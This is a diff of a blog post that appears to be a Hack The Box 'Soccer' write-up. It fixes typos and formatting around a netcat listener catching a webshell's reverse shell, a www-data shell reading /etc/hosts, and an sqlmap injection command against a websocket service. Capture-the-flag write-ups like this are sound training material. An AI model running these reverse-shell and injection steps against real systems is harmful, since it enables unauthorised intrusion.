@@ -166,7 +166,9 @@ Let's try to use admin credential.....
 
 BOOM!!!
 
-we can uload a webshekk
+we can now uload a webshell
+
+{% highlight shell %}
 
 xabaras@helix:~/workdir/ctf/htb/soccer.htb$ nc -nvlp 8000
 Listening on 0.0.0.0 8000
@@ -180,7 +182,6 @@ uid=33(www-data) gid=33(www-data) groups=33(www-data)
 $ $ 
 
 
-
 $ cat /etc/hosts
 127.0.0.1	localhost	soccer	soccer.htb	soc-player.soccer.htb
 
@@ -188,13 +189,13 @@ $ cat /etc/hosts
 
 $ 
 
+{% endhighlight %}
 
 
 
 
 
-
-abaras@helix:~/workdir/ctf/htb/soccer.htb$ sqlmap -u ws://soc-player.soccer.htb:9091/ --data '{"id":"64286*"}'
+xabaras@helix:~/workdir/ctf/htb/soccer.htb$ sqlmap -u ws://soc-player.soccer.htb:9091/ --data '{"id":"64286*"}'
         ___
        __H__
  ___ ___[(]_____ ___ ___  {1.6.4#stable}
